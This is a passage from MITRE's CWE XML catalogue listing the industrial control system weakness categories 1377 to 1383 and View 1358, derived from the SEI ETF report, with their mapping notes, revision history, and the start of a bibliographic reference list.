            <Has_Member CWE_ID="1393" View_ID="1358"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-1248" Section="Security Gaps in Commissioning"/>
         </References>
         <Mapping_Notes>
            <Usage>Prohibited</Usage>
            <Rationale>This entry is a Category. Using categories for mapping has been discouraged since 2019. Categories are informal organizational groupings of weaknesses that can help CWE users with data aggregation, navigation, and browsing. However, they are not weaknesses in themselves.</Rationale>
            <Comments>See member weaknesses of this category.</Comments>
            <Reasons>
               <Reason Type="Category"/>
            </Reasons>
         </Mapping_Notes>
	 <Notes>
	   <Note Type="Relationship">Relationships in this category are not authoritative and subject to change. See Maintenance notes.</Note>
	   <Note Type="Maintenance">This category was created in CWE 4.7 to facilitate and illuminate discussion about weaknesses in ICS with [REF-1248] as a starting point. After the release of CWE 4.9 in October 2022, this has been under active review by members of the "Boosting CWE" subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG). Relationships are still subject to change. In addition, there may be some issues in [REF-1248] that are outside of the current scope of CWE, which will require consultation with many CWE stakeholders to resolve.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>New Categories of Security Vulnerabilities (NCSV) Technical Project Team (TPT)</Submission_Name>
               <Submission_Organization>Securing Energy Infrastructure Executive Task Force</Submission_Organization>
               <Submission_Date>2022-03-09</Submission_Date>
               <Submission_Version>4.7</Submission_Version>
               <Submission_ReleaseDate>2022-04-28</Submission_ReleaseDate>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Maintenance_Notes, Relationship_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
            <Contribution Type="Content">
               <Contribution_Name>"Boosting CWE Content" Sub-Working Group</Contribution_Name>
               <Contribution_Organization>CWE-CAPEC ICS/OT SIG</Contribution_Organization>
               <Contribution_Date>2023-01-24</Contribution_Date>
               <Contribution_Comment>Suggested weaknesses to add to this category.</Contribution_Comment>
            </Contribution>
         </Content_History>
      </Category>
      <Category ID="1377" Name="ICS Engineering (Construction/Deployment): Inherent Predictability in Design" Status="Incomplete">
         <Summary>Weaknesses in this category are related to the "Inherent Predictability in Design" category from the SEI ETF "Categories of Security Vulnerabilities in ICS" as published in March 2022: "The commonality of design (in ICS/SCADA architectures) for energy systems and environments opens up the possibility of scaled compromise by leveraging the inherent predictability in the design." Note: members of this category include "Nearest IT Neighbor" recommendations from the report, as well as suggestions by the CWE team. These relationships are likely to change in future CWE versions.</Summary>
         <Relationships>
            <Has_Member CWE_ID="1278" View_ID="1358"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-1248" Section="Inherent Predictability in Design"/>
         </References>
         <Mapping_Notes>
            <Usage>Prohibited</Usage>
            <Rationale>This entry is a Category. Using categories for mapping has been discouraged since 2019. Categories are informal organizational groupings of weaknesses that can help CWE users with data aggregation, navigation, and browsing. However, they are not weaknesses in themselves.</Rationale>
            <Comments>See member weaknesses of this category.</Comments>
            <Reasons>
               <Reason Type="Category"/>
            </Reasons>
         </Mapping_Notes>
	 <Notes>
	   <Note Type="Relationship">Relationships in this category are not authoritative and subject to change. See Maintenance notes.</Note>
	   <Note Type="Maintenance">This category was created in CWE 4.7 to facilitate and illuminate discussion about weaknesses in ICS with [REF-1248] as a starting point. After the release of CWE 4.9 in October 2022, this has been under active review by members of the "Boosting CWE" subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG). Relationships are still subject to change. In addition, there may be some issues in [REF-1248] that are outside of the current scope of CWE, which will require consultation with many CWE stakeholders to resolve.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>New Categories of Security Vulnerabilities (NCSV) Technical Project Team (TPT)</Submission_Name>
               <Submission_Organization>Securing Energy Infrastructure Executive Task Force</Submission_Organization>
               <Submission_Date>2022-03-09</Submission_Date>
               <Submission_Version>4.7</Submission_Version>
               <Submission_ReleaseDate>2022-04-28</Submission_ReleaseDate>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Maintenance_Notes, Relationship_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
         </Content_History>
      </Category>
      <Category ID="1378" Name="ICS Operations (&amp; Maintenance): Gaps in obligations and training" Status="Incomplete">
         <Summary>Weaknesses in this category are related to the "Gaps in obligations and training" category from the SEI ETF "Categories of Security Vulnerabilities in ICS" as published in March 2022: "OT ownership and responsibility for identifying and mitigating vulnerabilities are not clearly defined or communicated within an organization, leaving environments unpatched, exploitable, and with a broader attack surface." Note: members of this category include "Nearest IT Neighbor" recommendations from the report, as well as suggestions by the CWE team. These relationships are likely to change in future CWE versions.</Summary>
         <References>
            <Reference External_Reference_ID="REF-1261"/>
            <Reference External_Reference_ID="REF-1248" Section="Gaps in obligations and training"/>
         </References>
         <Mapping_Notes>
            <Usage>Prohibited</Usage>
            <Rationale>This entry is a Category. Using categories for mapping has been discouraged since 2019. Categories are informal organizational groupings of weaknesses that can help CWE users with data aggregation, navigation, and browsing. However, they are not weaknesses in themselves.</Rationale>
            <Comments>See member weaknesses of this category.</Comments>
            <Reasons>
               <Reason Type="Category"/>
            </Reasons>
         </Mapping_Notes>
	 <Notes>
	   <Note Type="Relationship">Relationships in this category are not authoritative and subject to change. See Maintenance notes.</Note>
	   <Note Type="Maintenance">This category might be subject to CWE Scope Exclusion SCOPE.HUMANPROC (Human/organizational process).</Note>
	   <Note Type="Maintenance">This category was created in CWE 4.7 to facilitate and illuminate discussion about weaknesses in ICS with [REF-1248] as a starting point. After the release of CWE 4.9 in October 2022, this has been under active review by members of the "Boosting CWE" subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG). Subgroup members did not find any CWEs to add to this category in CWE 4.11. There may be some gaps with respect to CWE's current scope, which will require consultation with many CWE stakeholders to resolve.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>New Categories of Security Vulnerabilities (NCSV) Technical Project Team (TPT)</Submission_Name>
               <Submission_Organization>Securing Energy Infrastructure Executive Task Force</Submission_Organization>
               <Submission_Date>2022-03-09</Submission_Date>
               <Submission_Version>4.7</Submission_Version>
               <Submission_ReleaseDate>2022-04-28</Submission_ReleaseDate>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Maintenance_Notes, Relationship_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Maintenance_Notes, Mapping_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
         </Content_History>
      </Category>
      <Category ID="1379" Name="ICS Operations (&amp; Maintenance): Human factors in ICS environments" Status="Incomplete">
         <Summary>Weaknesses in this category are related to the "Human factors in ICS environments" category from the SEI ETF "Categories of Security Vulnerabilities in ICS" as published in March 2022: "Environmental factors in ICS including physical duress, system complexities, and isolation may result in security gaps or inadequacies in the performance of individual duties and responsibilities." Note: members of this category include "Nearest IT Neighbor" recommendations from the report, as well as suggestions by the CWE team. These relationships are likely to change in future CWE versions.</Summary>
         <Relationships>
            <Has_Member CWE_ID="655" View_ID="1358"/>
            <Has_Member CWE_ID="451" View_ID="1358"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-1248" Section="Human factors in ICS environments"/>
         </References>
         <Mapping_Notes>
            <Usage>Prohibited</Usage>
            <Rationale>This entry is a Category. Using categories for mapping has been discouraged since 2019. Categories are informal organizational groupings of weaknesses that can help CWE users with data aggregation, navigation, and browsing. However, they are not weaknesses in themselves.</Rationale>
            <Comments>See member weaknesses of this category.</Comments>
            <Reasons>
               <Reason Type="Category"/>
            </Reasons>
         </Mapping_Notes>
	 <Notes>
	   <Note Type="Relationship">Relationships in this category are not authoritative and subject to change. See Maintenance notes.</Note>
	   <Note Type="Maintenance">This category might be subject to CWE Scope Exclusion SCOPE.HUMANPROC (Human/organizational process).</Note>
	   <Note Type="Maintenance">This category was created in CWE 4.7 to facilitate and illuminate discussion about weaknesses in ICS with [REF-1248] as a starting point. After the release of CWE 4.9 in October 2022, this has been under active review by members of the "Boosting CWE" subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG). Subgroup members did not find any CWEs to add to this category in CWE 4.11. There may be some gaps with respect to CWE's current scope, which will require consultation with many CWE stakeholders to resolve.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>New Categories of Security Vulnerabilities (NCSV) Technical Project Team (TPT)</Submission_Name>
               <Submission_Organization>Securing Energy Infrastructure Executive Task Force</Submission_Organization>
               <Submission_Date>2022-03-09</Submission_Date>
               <Submission_Version>4.7</Submission_Version>
               <Submission_ReleaseDate>2022-04-28</Submission_ReleaseDate>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Maintenance_Notes, Relationship_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Maintenance_Notes, Mapping_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
         </Content_History>
      </Category>
      <Category ID="1380" Name="ICS Operations (&amp; Maintenance): Post-analysis changes" Status="Incomplete">
         <Summary>Weaknesses in this category are related to the "Post-analysis changes" category from the SEI ETF "Categories of Security Vulnerabilities in ICS" as published in March 2022: "Changes made to a previously analyzed and approved ICS environment can introduce new security vulnerabilities (as opposed to safety)." Note: members of this category include "Nearest IT Neighbor" recommendations from the report, as well as suggestions by the CWE team. These relationships are likely to change in future CWE versions.</Summary>
         <References>
            <Reference External_Reference_ID="REF-1248" Section="Post-analysis changes"/>
         </References>
         <Mapping_Notes>
            <Usage>Prohibited</Usage>
            <Rationale>This entry is a Category. Using categories for mapping has been discouraged since 2019. Categories are informal organizational groupings of weaknesses that can help CWE users with data aggregation, navigation, and browsing. However, they are not weaknesses in themselves.</Rationale>
            <Comments>See member weaknesses of this category.</Comments>
            <Reasons>
               <Reason Type="Category"/>
            </Reasons>
         </Mapping_Notes>
	 <Notes>
	   <Note Type="Relationship">Relationships in this category are not authoritative and subject to change. See Maintenance notes.</Note>
	   <Note Type="Maintenance">This category might be subject to CWE Scope Exclusion SCOPE.HUMANPROC (Human/organizational process).</Note>
	   <Note Type="Maintenance">This category was created in CWE 4.7 to facilitate and illuminate discussion about weaknesses in ICS with [REF-1248] as a starting point. After the release of CWE 4.9 in October 2022, this has been under active review by members of the "Boosting CWE" subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG). Subgroup members did not find any CWEs to add to this category in CWE 4.11. There may be some gaps with respect to CWE's current scope, which will require consultation with many CWE stakeholders to resolve.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>New Categories of Security Vulnerabilities (NCSV) Technical Project Team (TPT)</Submission_Name>
               <Submission_Organization>Securing Energy Infrastructure Executive Task Force</Submission_Organization>
               <Submission_Date>2022-03-09</Submission_Date>
               <Submission_Version>4.7</Submission_Version>
               <Submission_ReleaseDate>2022-04-28</Submission_ReleaseDate>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Maintenance_Notes, Relationship_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Maintenance_Notes, Mapping_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
         </Content_History>
      </Category>
      <Category ID="1381" Name="ICS Operations (&amp; Maintenance): Exploitable Standard Operational Procedures" Status="Incomplete">
         <Summary>Weaknesses in this category are related to the "Exploitable Standard Operational Procedures" category from the SEI ETF "Categories of Security Vulnerabilities in ICS" as published in March 2022: "Standard ICS Operational Procedures developed for safety and operational functionality in a closed, controlled communications environment can introduce vulnerabilities in a more connected environment." Note: members of this category include "Nearest IT Neighbor" recommendations from the report, as well as suggestions by the CWE team. These relationships are likely to change in future CWE versions.</Summary>
         <References>
            <Reference External_Reference_ID="REF-1248" Section="Exploitable Standard Operational Procedures"/>
         </References>
         <Mapping_Notes>
            <Usage>Prohibited</Usage>
            <Rationale>This entry is a Category. Using categories for mapping has been discouraged since 2019. Categories are informal organizational groupings of weaknesses that can help CWE users with data aggregation, navigation, and browsing. However, they are not weaknesses in themselves.</Rationale>
            <Comments>See member weaknesses of this category.</Comments>
            <Reasons>
               <Reason Type="Category"/>
            </Reasons>
         </Mapping_Notes>
	 <Notes>
	   <Note Type="Relationship">Relationships in this category are not authoritative and subject to change. See Maintenance notes.</Note>
	   <Note Type="Maintenance">This entry might be subject to CWE Scope Exclusions SCOPE.SITUATIONS (Focus on situations in which weaknesses may appear) and/or SCOPE.HUMANPROC (Human/organizational process).</Note>
	   <Note Type="Maintenance">This category was created in CWE 4.7 to facilitate and illuminate discussion about weaknesses in ICS with [REF-1248] as a starting point. After the release of CWE 4.9 in October 2022, this has been under active review by members of the "Boosting CWE" subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG). Subgroup members did not find any CWEs to add to this category in CWE 4.11. There may be some gaps with respect to CWE's current scope, which will require consultation with many CWE stakeholders to resolve.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>New Categories of Security Vulnerabilities (NCSV) Technical Project Team (TPT)</Submission_Name>
               <Submission_Organization>Securing Energy Infrastructure Executive Task Force</Submission_Organization>
               <Submission_Date>2022-03-09</Submission_Date>
               <Submission_Version>4.7</Submission_Version>
               <Submission_ReleaseDate>2022-04-28</Submission_ReleaseDate>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Maintenance_Notes, Relationship_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Maintenance_Notes, Mapping_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
         </Content_History>
      </Category>
      <Category ID="1382" Name="ICS Operations (&amp; Maintenance): Emerging Energy Technologies" Status="Incomplete">
         <Summary>Weaknesses in this category are related to the "Emerging Energy Technologies" category from the SEI ETF "Categories of Security Vulnerabilities in ICS" as published in March 2022: "With the rapid evolution of the energy system accelerated by the emergence of new technologies such as DERs, electric vehicles, advanced communications (5G+), novel and diverse challenges arise for secure and resilient operation of the system." Note: members of this category include "Nearest IT Neighbor" recommendations from the report, as well as suggestions by the CWE team. These relationships are likely to change in future CWE versions.</Summary>
         <Relationships>
            <Has_Member CWE_ID="20" View_ID="1358"/>
            <Has_Member CWE_ID="285" View_ID="1358"/>
            <Has_Member CWE_ID="295" View_ID="1358"/>
            <Has_Member CWE_ID="296" View_ID="1358"/>
            <Has_Member CWE_ID="346" View_ID="1358"/>
            <Has_Member CWE_ID="406" View_ID="1358"/>
            <Has_Member CWE_ID="601" View_ID="1358"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-1248" Section="Emerging Energy Technologies"/>
         </References>
         <Mapping_Notes>
            <Usage>Prohibited</Usage>
            <Rationale>This entry is a Category. Using categories for mapping has been discouraged since 2019. Categories are informal organizational groupings of weaknesses that can help CWE users with data aggregation, navigation, and browsing. However, they are not weaknesses in themselves.</Rationale>
            <Comments>See member weaknesses of this category.</Comments>
            <Reasons>
               <Reason Type="Category"/>
            </Reasons>
         </Mapping_Notes>
	 <Notes>
	   <Note Type="Relationship">Relationships in this category are not authoritative and subject to change. See Maintenance notes.</Note>
	   <Note Type="Maintenance">This category might be subject to CWE Scope Exclusion SCOPE.SITUATIONS (Focus on situations in which weaknesses may appear).</Note>
	   <Note Type="Maintenance">This category was created in CWE 4.7 to facilitate and illuminate discussion about weaknesses in ICS with [REF-1248] as a starting point. After the release of CWE 4.9 in October 2022, this has been under active review by members of the "Boosting CWE" subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG). Subgroup members did not find any CWEs to add to this category in CWE 4.11. There may be some gaps with respect to CWE's current scope, which will require consultation with many CWE stakeholders to resolve.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>New Categories of Security Vulnerabilities (NCSV) Technical Project Team (TPT)</Submission_Name>
               <Submission_Organization>Securing Energy Infrastructure Executive Task Force</Submission_Organization>
               <Submission_Date>2022-03-09</Submission_Date>
               <Submission_Version>4.7</Submission_Version>
               <Submission_ReleaseDate>2022-04-28</Submission_ReleaseDate>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Maintenance_Notes, Relationship_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Maintenance_Notes, Mapping_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
         </Content_History>
      </Category>
      <Category ID="1383" Name="ICS Operations (&amp; Maintenance): Compliance/Conformance with Regulatory Requirements" Status="Incomplete">
         <Summary>Weaknesses in this category are related to the "Compliance/Conformance with Regulatory Requirements" category from the SEI ETF "Categories of Security Vulnerabilities in ICS" as published in March 2022: "The ICS environment faces overlapping regulatory regimes and authorities with multiple focus areas (e.g., operational resiliency, physical safety, interoperability, and security) which can result in cyber security vulnerabilities when implemented as written due to gaps in considerations, outdatedness, or conflicting requirements." Note: members of this category include "Nearest IT Neighbor" recommendations from the report, as well as suggestions by the CWE team. These relationships are likely to change in future CWE versions.</Summary>
         <Relationships>
            <Has_Member CWE_ID="710" View_ID="1358"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-1248" Section="Compliance/Conformance with Regulatory Requirements"/>
         </References>
         <Mapping_Notes>
            <Usage>Prohibited</Usage>
            <Rationale>This entry is a Category. Using categories for mapping has been discouraged since 2019. Categories are informal organizational groupings of weaknesses that can help CWE users with data aggregation, navigation, and browsing. However, they are not weaknesses in themselves.</Rationale>
            <Comments>See member weaknesses of this category.</Comments>
            <Reasons>
               <Reason Type="Category"/>
            </Reasons>
         </Mapping_Notes>
	 <Notes>
	   <Note Type="Relationship">Relationships in this category are not authoritative and subject to change. See Maintenance notes.</Note>
	   <Note Type="Maintenance">This entry might be subject to CWE Scope Exclusions SCOPE.SITUATIONS (Focus on situations in which weaknesses may appear) and/or SCOPE.HUMANPROC (Human/organizational process).</Note>
	   <Note Type="Maintenance">This category was created in CWE 4.7 to facilitate and illuminate discussion about weaknesses in ICS with [REF-1248] as a starting point. After the release of CWE 4.9 in October 2022, this has been under active review by members of the "Boosting CWE" subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG). Subgroup members did not find any CWEs to add to this category in CWE 4.11. There may be some gaps with respect to CWE's current scope, which will require consultation with many CWE stakeholders to resolve.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>New Categories of Security Vulnerabilities (NCSV) Technical Project Team (TPT)</Submission_Name>
               <Submission_Organization>Securing Energy Infrastructure Executive Task Force</Submission_Organization>
               <Submission_Date>2022-03-09</Submission_Date>
               <Submission_Version>4.7</Submission_Version>
               <Submission_ReleaseDate>2022-04-28</Submission_ReleaseDate>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Maintenance_Notes, Relationship_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Maintenance_Notes, Mapping_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
         </Content_History>
      </Category>
   </Categories>
   <Views>
      <View ID="1358" Name="Weaknesses in SEI ETF Categories of Security Vulnerabilities in ICS" Type="Graph" Status="Incomplete">
         <Objective>CWE entries in this view (graph) are associated with the Categories of Security Vulnerabilities in ICS, as published by the Securing Energy Infrastructure Executive Task Force (SEI ETF) in March 2022. Weaknesses and categories in this view are focused on issues that affect ICS (Industrial Control Systems) but have not been traditionally covered by CWE in the past due to its earlier emphasis on enterprise IT software. Note: weaknesses in this view are based on "Nearest IT Neighbor" recommendations and other suggestions by the CWE team. These relationships are likely to change in future CWE versions.</Objective>
         <Audience>
            <Stakeholder>
	      <Type>Hardware Designers</Type>
	      <Description>ICS/OT hardware designers can use this view to ensure a minimal set of weaknesses that should be avoided or mitigated during the design process.</Description>
            </Stakeholder>
            <Stakeholder>
	      <Type>Product Vendors</Type>
	      <Description>Product vendors can use this view to ensure that all aspects of the product lifecycle address these weaknesses.</Description>
            </Stakeholder>
            <Stakeholder>
	      <Type>Assessment Tool Vendors</Type>
	      <Description>Assessment tool vendors that help to assess potential weaknesses, or avoid them, can use this view to improve their tool's coverage to address more weaknesses.</Description>
            </Stakeholder>
            <Stakeholder>
	      <Type>Academic Researchers</Type>
	      <Description>Academic researchers can use this view to identify potential research opportunities that could produce better methods for detection or avoidance of weaknesses in ICS/OT products.</Description>
            </Stakeholder>
         </Audience>
	 <Members>
	    <Has_Member CWE_ID="1359" View_ID="1358"/>
	    <Has_Member CWE_ID="1360" View_ID="1358"/>
	    <Has_Member CWE_ID="1361" View_ID="1358"/>
	    <Has_Member CWE_ID="1362" View_ID="1358"/>
	    <Has_Member CWE_ID="1363" View_ID="1358"/>
	 </Members>
         <References>
            <Reference External_Reference_ID="REF-1248"/>
         </References>
         <Mapping_Notes>
            <Usage>Prohibited</Usage>
            <Rationale>This entry is a View. Views are not weaknesses and therefore inappropriate to describe the root causes of vulnerabilities.</Rationale>
            <Comments>Use this View or other Views to search and navigate for the appropriate weakness.</Comments>
            <Reasons>
               <Reason Type="View"/>
            </Reasons>
         </Mapping_Notes>
	 <Notes>
	   <Note Type="Relationship">Relationships in this view are not authoritative and subject to change. See Maintenance notes.</Note>
	   <Note Type="Maintenance">This view was created in CWE 4.7 to facilitate and illuminate discussion about weaknesses in ICS with [REF-1248] as a starting point. After the release of CWE 4.9 in October 2022, this has been under active review by members of the "Boosting CWE" subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG). Relationships are still subject to change. In addition, there may be some issues in [REF-1248] that are outside of the current scope of CWE, which will require consultation with many CWE stakeholders to resolve.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>New Categories of Security Vulnerabilities (NCSV) Technical Project Team (TPT)</Submission_Name>
               <Submission_Organization>Securing Energy Infrastructure Executive Task Force</Submission_Organization>
               <Submission_Date>2022-03-09</Submission_Date>
               <Submission_Version>4.7</Submission_Version>
               <Submission_ReleaseDate>2022-04-28</Submission_ReleaseDate>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Maintenance_Notes, Relationship_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
         </Content_History>
      </View>
   </Views>
   <External_References>
      <External_Reference Reference_ID="REF-6">
			<Author>Katrina Tsipenyuk</Author>
			<Author>Brian Chess</Author>
			<Author>Gary McGraw</Author>
			<Title>Seven Pernicious Kingdoms: A Taxonomy of Software Security Errors</Title>
			<Publication>NIST Workshop on Software Security Assurance Tools Techniques and Metrics</Publication>
			<Publication_Year>2005</Publication_Year>
			<Publication_Month>--11</Publication_Month>
			<Publication_Day>---07</Publication_Day>
			<Publisher>NIST</Publisher>
			<URL>https://samate.nist.gov/SSATTM_Content/papers/Seven%20Pernicious%20Kingdoms%20-%20Taxonomy%20of%20Sw%20Security%20Errors%20-%20Tsipenyuk%20-%20Chess%20-%20McGraw.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-7">
			<Author>Michael Howard</Author>
			<Author>David LeBlanc</Author>
			<Title>Writing Secure Code</Title>
			<Edition>2nd Edition</Edition>
			<Publication_Year>2002</Publication_Year>
			<Publication_Month>--12</Publication_Month>
			<Publication_Day>---04</Publication_Day>
			<Publisher>Microsoft Press</Publisher>
			<URL>https://www.microsoftpressstore.com/store/writing-secure-code-9780735617223</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-18">
			<Author>Secure Software, Inc.</Author>
			<Title>The CLASP Application Security Process</Title>
			<Publication_Year>2005</Publication_Year>
			<URL>https://cwe.mitre.org/documents/sources/TheCLASPApplicationSecurityProcess.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-44">
			<Author>Michael Howard</Author>
			<Author>David LeBlanc</Author>
			<Author>John Viega</Author>
			<Title>24 Deadly Sins of Software Security</Title>
			<Publication>McGraw-Hill</Publication>
			<Publication_Year>2010</Publication_Year>
		</External_Reference>
      <External_Reference Reference_ID="REF-45">
			<Author>OWASP</Author>
			<Title>OWASP Enterprise Security API (ESAPI) Project</Title>
			<URL>http://www.owasp.org/index.php/ESAPI</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-48">
			<Author>Jeremiah Grossman</Author>
			<Title>Input validation or output filtering, which is better?</Title>
			<Publication_Year>2007</Publication_Year>
			<Publication_Month>--01</Publication_Month>
			<Publication_Day>---30</Publication_Day>
			<URL>https://blog.jeremiahgrossman.com/2007/01/input-validation-or-output-filtering.html</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-56">
			<Author>Microsoft</Author>
			<Title>Using the Strsafe.h Functions</Title>
			<URL>https://learn.microsoft.com/en-us/windows/win32/menurc/strsafe-ovw?redirectedfrom=MSDN</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-57">
			<Author>Matt Messier</Author>
			<Author>John Viega</Author>
			<Title>Safe C String Library v1.0.3</Title>
			<URL>http://www.gnu-darwin.org/www001/ports-1.5a-CURRENT/devel/safestr/work/safestr-1.0.3/doc/safestr.html</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-58">
			<Author>Michael Howard</Author>
			<Title>Address Space Layout Randomization in Windows Vista</Title>
			<URL>https://learn.microsoft.com/en-us/archive/blogs/michael_howard/address-space-layout-randomization-in-windows-vista</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-60">
			<Title>PaX</Title>
			<URL>https://en.wikipedia.org/wiki/Executable_space_protection#PaX</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-61">
